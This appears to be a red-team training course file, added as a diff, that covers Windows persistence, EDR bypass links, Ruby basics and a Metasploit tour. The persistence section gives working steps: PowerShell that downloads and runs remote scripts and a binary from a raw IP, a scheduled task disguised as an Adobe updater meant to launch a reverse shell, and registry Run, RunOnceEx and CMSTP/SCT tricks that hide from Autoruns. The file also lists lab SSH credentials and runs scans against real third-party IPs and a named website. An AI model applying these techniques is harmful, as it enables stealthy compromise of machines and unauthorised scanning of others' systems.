@@ -1,0 +1,2410 @@
+################################
+# Attack Environment Deployers #
+################################
+https://github.com/mantvydasb/Red-Team-Infrastructure-Automation
+
+
+
+
+#################
+# Lab Deployers #
+#################
+https://github.com/jaredhaight/PowerShellClassLab
+https://github.com/outflanknl/Invoke-ADLabDeployer
+https://github.com/AutomatedLab/AutomatedLab
+
+
+
+
+###############
+# Persistence #
+###############
+https://rastamouse.me/2018/03/a-view-of-persistence/
+https://blog.inspired-sec.com/archive/2017/01/20/WMI-Persistence.html
+https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
+https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
+
+
+
+
+####################
+# Lateral Movement #
+####################
+
+
+###########################
+# Bypassing EDR Solutions #
+###########################
+https://lospi.net/security/assembly/c/cpp/developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html
+https://github.com/vysecurity/morphHTA
+https://labs.mwrinfosecurity.com/blog/experimenting-bypassing-memory-scanners-with-cobalt-strike-and-gargoyle/
+ 
+
+
+###############################
+# Device Guard Check & Bypass #
+###############################
+https://github.com/SadProcessor/SomeStuff/blob/master/Invoke-OSiRis.ps1
+
+
+######################
+# EDR Check & Bypass #
+######################
+https://github.com/SadProcessor/SomeStuff/blob/master/Invoke-EDRCheck.ps1
+
+
+
+
+###############
+# Persistance #
+###############
+
+
+---- Scheduled Task Based Persistance ----
+1. Scheduled task based on most commonly occuring event ID
+https://github.com/TestingPens/MalwarePersistenceScripts/blob/master/user_event_persistence.ps1
+
+
+
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
+
+---------------------------Type This-----------------------------------
+mkdir c:\persistence
+
+cd c:\persistence
+
+Get-ExecutionPolicy
+Set-ExecutionPolicy Unrestricted –Force
+
+$client = new-object System.Net.WebClient
+$client.DownloadFile("https://raw.githubusercontent.com/TestingPens/MalwarePersistenceScripts/master/user_event_persistence.ps1","c:\persistence\user_event_persistence.ps1")
+
+dir
+
+.\user_event_persistence.ps1
+-------------------------------------------------------------------------
+
+
+
+- Alternative method 1:
+-----------------------
+As administrator create a basic task as an administrator with the following information:
+
+Name:                    Adobe Systems Incorporated
+
+Description:             This task keeps your Adobe Flash Player installation up to date with the latest enhancements and security fixes. If this task is disabled or removed, Adobe Flash Player will be unable to automatically secure your machine with the latest security fixes.
+
+
+
+Task Trigger:             Daily
+
+Start a program:          C:\Windows\System32\calc.exe
+
+
+
+- Alternative method 2:
+-----------------------
+In this case we will not be running PowerShell. We create a scheduled task definition file called "Adobe Flash Player Updater.xml"
+ 
+- Copy and paste the code below into the "Adobe Flash Player Updater.xml" definition file on target machine:
+- adapt  <UserId></UserId> to SID of current user if you do not have administrative privileges (wmic useraccount where name='user' get sid)
+- adapt  <Command>C:\Windows\System32\calc.exe</Command> to your reverse shell executable
+- this scheduled task triggers on a event, can be changed to regular calls (e.g. once an hour)
+ 
+--------------------------------
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Author>Adobe Systems Incorporated</Author>
+    <Description>This task keeps your Adobe Flash Player installation up to date with the latest enhancements and security fixes. If this task is disabled or removed, Adobe Flash Player will be unable to automatically secure your machine with the latest security fixes.</Description>
+  </RegistrationInfo>
+  <Triggers>
+    <EventTrigger>
+      <Enabled>true</Enabled>
+      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Application"&gt;&lt;Select Path="Application"&gt;*[System[EventID=15]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
+    </EventTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>LeastPrivilege</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>C:\Windows\System32\calc.exe</Command>
+    </Exec>
+  </Actions>
+</Task>
+ 
+---------------------------
+ 
+Now let's create the scheduled task
+---------------------------Type This-----------------------------------
+schtasks /create /tn "Adobe Updater" /xml "Adobe Flash Player Updater.xml"
+----------------------------------------------------------------------- 
+
+
+Sit back and wait for the task to trigger. By the way we got the correct XML file format by creating a scheduled tasked and exporting it to an XML file. Then we were able to make some trivial changes to the file and import it.
+
+
+
+
+---- Registry Based Persistance ---
+1. RunOnce key persistance trick
+Reference:
+https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
+
+
+
+1. upload your executable to system
+2. add registry entry (requires admin privileges):
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001 /v "Line1" /d "||c:\path\to\malicious.exe"
+ 
+Note:
+Beacon/Shell may prevent the user to login as he is hanging in the Beacon executable. Solution: spawn new beacon and exit initial beacon.
+
+
+
+
+
+2. GLOBALFLAGS IN IMAGE FILE EXECUTION OPTIONS
+Let's try this:
+https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/
+
+
+2. Hide Reg
+Let's try this code out:
+https://gist.github.com/brianreitz/feb4e14bd45dd2e4394c225b17df5741
+
+Reference:
+https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353
+
+
+
+
+Get the following two files
+---------------------------
+https://raw.githubusercontent.com/jaredcatkinson/PSReflect-Functions/master/PSReflect.ps1
+https://gist.githubusercontent.com/brianreitz/feb4e14bd45dd2e4394c225b17df5741/raw/8f77b5e2f1952299f3a2dca0ef6c9266fe3e7b08/PSReflect-RegHide.ps1
+
+In "PSReflect-RegHide.ps1" line 126, you can specify which command will be executed upon reboot (ex: 'cmd /c calc.exe'). It will be invisible for regedit and powershell.
+
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
+
+---------------------------Type This-----------------------------------
+mkdir c:\persistence
+
+cd c:\persistence
+
+(new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/jaredcatkinson/PSReflect-Functions/master/PSReflect.ps1", "c:\persistence\PSReflect.ps1")
+
+(new-object System.Net.WebClient).DownloadFile("https://gist.githubusercontent.com/brianreitz/feb4e14bd45dd2e4394c225b17df5741/raw/8f77b5e2f1952299f3a2dca0ef6c9266fe3e7b08/PSReflect-RegHide.ps1", "c:\persistence\PSReflect-RegHide.ps1")
+
+.\PSReflect-RegHide.ps1
+-------------------------------------------------------------------------
+
+
+
+Now, let's check to see if the newly created registry value is hidden. You can do this by typing the following:
+---------------------------Type This-----------------------------------
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+Get-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+----------------------------------------------------------------------- 
+However, it will be visible e.g. for Sysinternals Autorun tool
+
+
+
+3. VShadow
+Let's try this out:
+https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/
+
+
+
+1. Download vshadow.exe including in the WinSDK
+    Windows 7: https://www.microsoft.com/en-us/download/details.aspx?id=8279
+    Windows 10: https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk
+2. Upload the vshadow.exe to the target machine
+3. Choose an arbitrary persistence mechanism to start vshadow.exe (e.g. Reg Key: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v VSSBackup /t REG_EXPAND_SZ /d "C:\Temp\vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:")
+
+
+---------------------------Type This-----------------------------------
+mkdir c:\persistence
+
+cd c:\persistence
+
+$client = new-object System.Net.WebClient
+$client.DownloadFile("http://45.63.104.73/win10_vshadow_x64.exe","c:\persistence\win10_vshadow_x64.exe")
+
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v VSSBackup /t REG_EXPAND_SZ /d "c:\persistence\vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:"
+-----------------------------------------------------------------------
+
+
+4. INF-SCT
+Let's try this out:
+https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
+https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
+
+
+Technique 1: CMSTP
+------------------
+create "c:\persistence\cmstp.inf" with the following content:
+-----------------------------------
+;cmstp.exe cmstp.inf
+ 
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+ 
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+ 
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,c:\persistence\test.sct
+ 
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="Yay"
+ShortSvcName="Yay"
+----------------------------------------------------
+
+
+
+get a sample sct payload (e.g. https://gist.githubusercontent.com/bohops/6ded40c4989c673f2e30b9a6c1985019/raw/33dc4cae00a10eb86c02b561b1c832df6de40ef6/test.sct) and store it in "c:\persistence\test.sct"
+
+
+---------------------------Type This-----------------------------------
+mkdir c:\persistence
+
+cd c:\persistence
+
+$client = new-object System.Net.WebClient
+$client.DownloadFile("https://gist.githubusercontent.com/bohops/6ded40c4989c673f2e30b9a6c1985019/raw/33dc4cae00a10eb86c02b561b1c832df6de40ef6/test.sct","c:\persistence\test.sct")
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v oemkey /t reg_sz /d C:\Windows\System32\cmstp.exe\" /s C:\persistence\cmstp.inf"
+-----------------------------------------------------------------------
+
+ 
+reboot your machine
+your sct payload will be executed upon reboot. HOWEVER, as a Windows binary executes it, Sysinternals Autorun tool will not show it, unless you untick  "Options->Hide Windows Entries" option
+
+
+ 
+5. GPScript.exe
+Let's try this out:
+https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/
+
+
+
+---- Cobalt Strike Agressor Persistance Scripts ----
+https://github.com/Und3rf10w/Aggressor-scripts/blob/master/kits/PersistKit/PersistKit.cna
+https://github.com/harleyQu1nn/AggressorScripts/blob/master/Persistence/UserSchtasksPersist.cna
+https://github.com/harleyQu1nn/AggressorScripts/blob/master/Persistence/ServiceEXEPersist.cna
+
+
+
+
+
+-------------------------------------------------------------------------------------------------------------
+ 
+############################
+# Day 2: Ruby Fundamentals #
+############################
+ 
+- I prefer to use Putty to SSH into my Linux host.
+- You can download Putty from here:
+- http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ 
+Here is the information to put into putty
+ 
+Host Name:          149.28.201.171
+protocol:           ssh
+port:               22
+username:           secureninja
+password:           secureninja!!
+ 
+- Ruby is a general-purpose, object-oriented programming language, which was created by Yukihiro Matsumoto, a computer
+scientist and programmer from Japan. It is a cross-platform dynamic language.
+ 
+- The major implementations of this language are Ruby MRI, JRuby, HotRuby, IronRuby, MacRuby, etc. Ruby
+on Rails is a framework that is written in Ruby.
+ 
+- Ruby's file name extensions are .rb and .rbw.
+ 
+- official website of this
+ 
+- language: www.ruby-lang.org.
+ 
+ 
+- interactive Shell called Ruby Shell
+ 
+ 
+- open up the interactive console and play around.
+ 
+---------------------------Type This-----------------------------------
+irb
+-----------------------------------------------------------------------
+ 
+ 
+- Math, Variables, Classes, Creating Objects and Inheritance
+ 
+ 
+The following arithmetic operators:
+    Addition operator (+) — 10 + 23
+    Subtraction operator (-) — 1001 - 34
+    Multiplication operator (*) — 5 * 5
+    Division operator (/) — 12 / 2
+ 
+ 
+ 
+- Now let's cover some variable techniques. In Ruby, you can assign a value to a variable using the assignment
+operator. '=' is the assignment operator. In the following example, 25 is assigned to x. Then x is incremented by
+30. Again, 69 is assigned to y, and then y is incremented by 33.
+ 
+---------------------------Type This-----------------------------------
+x = 25
+x + 30
+y = 69
+y+33
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Let's look at creating classes and creating objects.
+ 
+- Here, the name of the class is Attack. An object has its properties and methods.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Attack
+attr_accessor :of, :sqli, :xss
+end
+-----------------------------------------------------------------------
+ 
+ 
+What is nil?
+Reference:
+https://www.codecademy.com/en/forum_questions/52a112378c1cccb0f6001638
+ 
+nil is the Ruby object that represents nothingness. Whenever a method doesn’t return a useful value, it returns nil. puts and print are methods that return nil:
+ 
+Since the Ruby Console always shows the value of the last statement or expression in your code, if that last statement is print, you’ll see the nil.
+ 
+To prevent the nil from "sticking" to the output of print (which doesn’t insert a line break), you can print a line break after it, and optionally put some other value as the last statement of your code, then the Console will show it instead of nil:
+ 
+ 
+ 
+ 
+ 
+# Now that we have created the classes let's create the objects
+---------------------------Type This-----------------------------------
+first_attack = Attack.new
+first_attack.of = "stack"
+first_attack.sqli = "blind"
+first_attack.xss = "dom"
+puts first_attack.of
+puts first_attack.sqli
+puts first_attack.xss
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Let's work on some inheritance that will help make your programming life easier. When we have multiple classes,
+inheritance becomes useful. In simple words, inheritance is the classification of classes. It is a process by which
+one object can access the properties/attributes of another object of a different class. Inheritance makes your
+programming life easier by maximizing code reuse.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Exploitframeworks
+attr_accessor :scanners, :exploits, :shellcode, :postmodules
+end
+class Metasploit < Exploitframeworks
+end
+class Canvas < Exploitframeworks
+end
+class Coreimpact < Exploitframeworks
+end
+class Saint < Exploitframeworks
+end
+class Exploitpack < Exploitframeworks
+end
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Methods, More Objects, Arguments, String Functions and Expression Shortcuts
+ 
+- Let's create a simple method. A method is used to perform an action and is generally called with an object.
+ 
+- Here, the name of the method is 'learning'. This method is defined inside the Msfnl class. When it is called,
+it will print this string: "We are Learning how to PenTest"
+ 
+- An object named 'bo' is created, which is used to call the method.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Msfnl
+def learning
+puts "We are Learning how to PenTest"
+end
+end
+-----------------------------------------------------------------------
+ 
+#Now let's define an object for our Method
+ 
+---------------------------Type This-----------------------------------
+joe = Msfnl.new
+joe.learning
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- An argument is a value or variable that is passed to the function while calling it. In the following example, while
+calling the puts() function, we are sending a string value to the function. This string value is used by the
+function to perform some particular operations.
+ 
+puts ("Pentesting")
+ 
+ 
+- There are many useful string functions in Ruby. String functions make it easy to work with strings. Now, we will
+explain some useful string functions with an example.
+ 
+- The length function calculates the length of a string. The upcase function converts a string to uppercase. And the
+reverse function reverses a string. The following example demonstrates how to use the string functions.
+ 
+---------------------------Type This-----------------------------------
+55.class
+"I Love Programming".class
+"I Love Pentesting".length
+"Pown that box".upcase
+"Love" + "To Root Boxes"
+"evil".reverse
+"evil".reverse.upcase
+-----------------------------------------------------------------------
+ 
+ 
+-  expressions and shortcuts. In the below example, 'a' is an operand, '3' is an operand,  '=' is
+an operator, and 'a=3' is the expression. A statement consists of one or multiple expressions. Following are the
+examples of some expressions.
+ 
+---------------------------Type This-----------------------------------
+a = 3
+b = 6
+a+b+20
+d = 44
+f = d
+puts f
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+- shortcuts. +=, *= are the shortcuts. These operators are also called abbreviated
+assignment operators. Use the shortcuts to get the effect of two statements in just one. Consider the following
+statements to understand the shortcuts.
+ 
+---------------------------Type This-----------------------------------
+g = 70
+g = g+44
+g += 33
+-----------------------------------------------------------------------
+ 
+ 
+- In the above statement, g is incremented by 33 and then the total value is assigned to g.
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+g *= 3
+-----------------------------------------------------------------------
+ 
+ 
+- In the above statement, g is multiplied with 3 and then assigned to g.
+ 
+- Example
+ 
+- Comparison Operators, Loops, Data Types, and Constants
+ 
+- Comparison operators are used for comparing one variable or constant with another variable or constant. We will show
+how to use the following comparison operators.
+ 
+'Less than' operator (<): This operator is used to check whether a variable or constant is less than another
+variable or constant. If it's less than the other, the 'less than' operator returns true.
+ 
+'Equal to' operator (==): This operator is used to check whether a variable or constant is equal to another variable
+or constant. If it's equal to the other, the 'equal to' operator returns true.
+ 
+'Not equal to' operator (!=): This operator is used to check whether a variable or constant is not equal to another
+variable or constant. If it's not equal to the other, the 'not equal to' operator returns true.
+ 
+---------------------------Type This-----------------------------------
+numberofports = 55
+puts "number of ports found during scan" if numberofports < 300
+numberofports = 400
+puts "number of ports found during scan" if numberofports < 300
+puts "number of ports found during scan" if numberofports == 300
+puts "number of ports found during scan" if numberofports != 300
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Example
+ 
+ 
+- the 'OR' operator and the 'unless' keyword. This symbol '||' represents the logical 'OR' operator.
+ 
+- This operator is generally used to combine multiple conditions.
+- In case of two conditions, if both or any of the conditions is true, the 'OR'operator returns true. Consider the
+ 
+- following example to understand how this operator works.
+ 
+---------------------------Type This-----------------------------------
+ports = 100
+puts "number of ports found on the network" if ports<100 || ports>200
+puts "number of ports found on the network" if ports<100 || ports>75
+-----------------------------------------------------------------------
+ 
+# unless
+ 
+---------------------------Type This-----------------------------------
+portsbelow1024 = 50
+puts "If the ports are below 1024" unless portsbelow1024 < 1000
+puts "If the ports are below 1024" unless portsbelow1024 < 1055
+puts "If the ports are below 1024" unless portsbelow1024 < 20
+-----------------------------------------------------------------------
+ 
+- The 'unless' keyword is used to do something programmatically unless a condition is true.
+ 
+ 
+ 
+- Loops are used to execute statement(s) repeatedly. Suppose you want to print a string 10 times.
+ 
+- See the following example to understand how a string is printed 10 times on the screen using a loop.
+ 
+---------------------------Type This-----------------------------------
+10.times do puts "infosecaddicts" end
+-----------------------------------------------------------------------
+ 
+# Or use the curly braces
+ 
+---------------------------Type This-----------------------------------
+10.times {puts "infosecaddicts"}
+-----------------------------------------------------------------------
+ 
+ 
+- Changing Data Types: Data type conversion is an important concept in Ruby because it gives you flexibility while
+working with different data types. Data type conversion is also known as type casting.
+ 
+ 
+ 
+- Constants: Unlike variables, the values of constants remain fixed during the program interpretation. So if you
+change the value of a constant, you will see a warning message.
+ 
+ 
+ 
+ 
+- Multiple Line String Variable, Interpolation, and Regular Expressions
+ 
+- A multiple line string variable lets you assign the value to the string variable through multiple lines.
+ 
+---------------------------Type This-----------------------------------
+infosecaddicts = <<mark
+welcome
+to the
+best
+metasploit
+course
+on the
+market
+mark
+puts infosecaddicts
+-----------------------------------------------------------------------
+ 
+ 
+- Interpolation lets you evaluate any placeholder within a string, and the placeholder is replaced with the value that
+it represents. So whatever you write inside #{ } will be evaluated and the value will be replaced at that position.
+Examine the following example to understand how interpolation works in Ruby.
+ 
+References:
+https://stackoverflow.com/questions/10869264/meaning-of-in-ruby
+ 
+ 
+---------------------------Type This-----------------------------------
+a = 4
+b = 6
+puts "a * b = a*b"
+puts " #{a} * #{b} = #{a*b} "
+person = "Joe McCray"
+puts "IT Security consultant person"
+puts "IT Security consultant #{person}"
+-----------------------------------------------------------------------
+ 
+- Notice that the placeholders inside #{ } are evaluated and they are replaced with their values.
+ 
+ 
+ 
+ 
+ 
+- Character classes
+---------------------------Type This-----------------------------------
+infosecaddicts = "I Scanned 45 hosts and found 500 vulnerabilities"
+"I love metasploit and what it has to offer!".scan(/[lma]/) {|y| puts y}
+"I love metasploit and what it has to offer!".scan(/[a-m]/) {|y| puts y}
+-----------------------------------------------------------------------
+ 
+ 
+- Arrays, Push and Pop, and Hashes
+ 
+ 
+- In the following example, numbers is an array that holds 6 integer numbers.
+ 
+ 
+---------------------------Type This-----------------------------------
+numbers = [2,4,6,8,10,100]
+puts numbers[0]
+puts numbers[4]
+numbers[2] = 150
+puts numbers
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Now we will show how you can implement a stack using an array in Ruby. A stack has two operations - push and pop.
+ 
+ 
+---------------------------Type This-----------------------------------
+framework = []
+framework << "modules"
+framework << "exploits"
+framework << "payloads"
+framework.pop
+framework.shift
+-----------------------------------------------------------------------
+ 
+- Hash is a collection of elements, which is like the associative array in other languages. Each element has a key
+that is used to access the element.
+ 
+ 
+- Hash is a Ruby object that has its built-in methods. The methods make it easy to work with hashes.
+In this example, 'metasploit' is a hash. 'exploits', 'microsoft', 'Linux' are the keys, and the following are the
+respective values: 'what module should you use', 'Windows XP' and 'SSH'.
+ 
+---------------------------Type This-----------------------------------
+metasploit = {'exploits' => 'what module should you use', 'microsoft' => 'Windows XP', 'Linux' => 'SSH'}
+print metasploit.size
+print metasploit["microsoft"]
+metasploit['microsoft'] = 'redhat'
+print metasploit['microsoft']
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Writing Ruby Scripts
+ 
+ 
+- Let's take a look at one of the ruby modules and see exactly now what it is doing. Now explain to me exactly what
+this program is doing. If we take a look at the ruby program what you find is that it is a TCP port scanner that
+someone made to look for a specific port. The port that it is looking for is port 21 FTP.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
+ls
+-----------------------------------------------------------------------
+ 
+ 
+ 
+###########################
+# Metasploit Fundamentals #
+###########################
+ 
+- Let's take a little look at Metasploit Framework
+ 
+- First, we should take note of the different directories, the Modular Architecture.
+ 
+The modules that make up the Modular Architecture are
+Exploits
+Auxiliary
+Payload
+Encoder
+Nops
+ 
+ 
+Important directories to keep in mind for Metasploit, in case we'd like to edit different modules, or add our own,
+ 
+are
+ 
+Modules
+Scripts
+Plugins
+External
+Data
+Tools
+ 
+- Let's take a look inside the Metasploit directory and see what's the
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit
+ls
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Now let's take a look inside the Modules directory and see what's there.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules
+ls
+-----------------------------------------------------------------------
+ 
+       
+The auxiliary directory is where the things like our port-scanners will be, or any module that we can run that does
+not necessarily need to - have a shell or session started on a machine.
+ 
+The exploits directory has our modules that we need to pop a shell on a box.
+The external directory is where we can see all of the modules that use external libraries from tools Metasploit uses
+like Burp Suite
+- Let's take a look at the external directory
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/external
+ls
+-----------------------------------------------------------------------
+ 
+- Our data directory holds helper modules for Metasploit to use with exploits or auxiliary modules.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/data
+ls
+-----------------------------------------------------------------------
+ 
+- For example, the wordlist directory holds files that have wordlists in them for brute-forcing logins or doing DNS
+brute-forcing
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/data/wordlists
+ls
+-----------------------------------------------------------------------
+ 
+- The Meterpreter directory inside of the data directory houses the DLLs used for the functionality of Meterpreter
+once a session is created.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/data/meterpreter
+ls
+-----------------------------------------------------------------------
+ 
+- The scripts inside the scripts/Meterpreter directory are scripts that Meterpreter uses for post-exploitation, things
+like escalating privileges and dumping hashes.
+ 
+These are being phased out, though, and post-exploitation modules are what is being more preferred.
+The next important directory that we should get used to is the 'tools' directory. Inside the tools directory we'll
+find a bunch of different ruby scripts that help us on a pentest with things ranging from creating a pattern of code
+for creating exploits, to a pattern offset script to find where at in machine language that we need to put in our
+custom shellcode.
+ 
+The final directory that we'll need to keep in mind is the plugins directory, which houses all the modules that have
+to do with other programs to make things like importing and exporting reports simple.
+Now that we have a clear understanding of what all of the different directories house, we can take a closer look at
+the exploits directory and get a better understanding of how the directory structure is there, so if we make our own
+modules we're going to have a better understanding of where everything needs to go.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/exploits
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- The exploits directory is split up into several different directories, each one housing exploits for different types
+of systems. I.E. Windows, Unix, OSX, dialup and so on.
+Likewise, if we were to go into the 'windows' directory, we're going to see that the exploits have been broken down
+into categories of different types of services/programs, so that you can pick out an exploit specifically for the
+service you're trying to exploit. Let's dig a little deeper into the auxiliary directory and see what all it holds
+for us.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/
+ls
+-----------------------------------------------------------------------      
+ 
+ 
+- And a little further into the directory, let's take a look at what's in the scanner directory
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/scanner/
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- And one more folder deeper into the structure, let's take a look in the portscan folder
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
+ls
+-----------------------------------------------------------------------    
+ 
+- If we run 'cat tcp.rb' we'll find that this module is simply a TCP scanner that will find tcp ports that are open
+and report them back to us in a nice, easily readable format.
+ 
+cat tcp.rb
+   
+ 
+ 
+- Just keep in mind that all of the modules in the auxiliary directory are there for information gathering and for use
+once you have a session on a machine.
+Taking a look at the payload directory, we can see all the available payloads, which are what run after an exploit
+succeeds.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/payloads/
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+- There are three different types of payloads: single, stagers, and staged. Each type of payload has a different
+application for it to be used as.
+Single payloads do everything you need them to do at one single time, so they call a shell back to you and let you
+do everything once you have that shell calling back to you.
+Stagers are required for limited payload space so that the victim machine will call back to your attack box to get
+the rest of the instructions on what it's supposed to do. The first stage of the payload doesn't require all that
+much space to just call back to the attacking machine to have the rest of the payload sent to it, mainly being used
+to download Stages payloads.
+ 
+ 
+- Stages are downloaded by stagers and typically do complex tasks, like VNC sessions, Meterpreter sessions, or bind
+shells.
+---------------------------Type This-----------------------------------
+cd singles
+cd windows
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- We can see several different payloads here that we can use on a windows system. Let's take a look at adduser.rb and
+see what it actually does.
+---------------------------Type This-----------------------------------
+cat adduser.rb
+-----------------------------------------------------------------------
+ 
+Which when looking at the code, we can see that it will add a new user called "Metasploit" to the machine and give
+the new user "Metasploit" a password of "Metasploit$1" Further down in the file we can actually see the command that
+it gives Windows to add the user to the system.
+ 
+ 
+- Stagers just connect to victim machine back to yours to download the Stages payload, usually with a
+ 
+windows/shell/bind_tcp or windows/shell/reverse_tcp
+---------------------------Type This-----------------------------------
+cd ../../stagers
+ls
+-----------------------------------------------------------------------
+   
+ 
+ 
+- Again, we can see that we have stagers for multiple systems and code types.
+---------------------------Type This-----------------------------------
+ls windows/
+-----------------------------------------------------------------------    
+ 
+ 
+As you can see, the stagers are mainly just to connect to the victim, to setup a bridge between us and the victim
+machine, so we can upload or download our stage payloads and execute commands.
+Lastly, we can go to our stages directory to see what all payloads are available for us to send over for use with
+our stagers...
+---------------------------Type This-----------------------------------
+cd ../stages
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+Again, we can see that our stages are coded for particular operating systems and languages.
+We can take a look at shell.rb and see the shellcode that would be put into the payload that would be staged on the
+victim machine which would be encoded to tell the victim machine where to connect back to and what commands to run,
+if any.
+ 
+- Other module directories include nops, encoders, and post. Post modules are what are used in sessions that have
+already been opened in meterpreter, to gain more information on the victim machine, collect hashes, or even tokens,
+so we can impersonate other users on the system in hopes of elevating our privileges.
+---------------------------Type This-----------------------------------
+cd ../../../post/
+ls
+cd windows/
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+Inside the windows directory we can see all the post modules that can be run, capture is a directory that holds all
+the modules to load keyloggers, or grab input from the victim machine. Escalate has modules that will try to
+escalate our privileges. Gather has modules that will try to enumerate the host to get as much information as
+possible out of it. WLAN directory holds modules that can pull down WiFi access points that the victim has in
+memory/registry and give you the AP names as well as the WEP/WPA/WPA2 key for the network.
+ 
+#################################
+# Getting start with MSFConsole #
+#################################
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/
+ 
+./msfconsole
+----------------------------------------------------------------------
+ 
+ 
+ 
+##############################################
+# Run any Linux command inside of MSFConsole #
+##############################################
+ 
+Once you are inside of MSFConsole you want to do EVERYTHING
+that you'd normally do in your Linux command shell in addition
+to running Metasploit commands.
+ 
+ 
+---------------------------Type This-----------------------------------
+ls
+ 
+pwd
+ 
+ping -c1 yahoo.com
+ 
+nmap yahoo.com
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- You're on the outside scanning publicly accessable targets.
+ 
+ 
+---------------------------Type This-----------------------------------
+use auxiliary/scanner/portscan/tcp
+ 
+set RHOSTS 217.108.137.200
+ 
+set PORTS 80,1433,1521,3306,8000,8080,8081,10000                      
+ 
+run
+----------------------------------------------------------------------
+ 
+ 
+ 
+        - So let's do a quick google search for someone with trace.axd file
+        - filetye:axd inurl:trace.axd
+--------------------------Type This-----------------------------------
+use auxiliary/scanner/http/     (press the tab key, then press y to look through the http options)
+----------------------------------------------------------------------
+ 
+- Here is an example:
+---------------------------Type This-----------------------------------
+use auxiliary/scanner/http/trace_axd
+ 
+set RHOSTS 207.20.57.112
+ 
+set VHOST www.motion-vr.net
+ 
+run
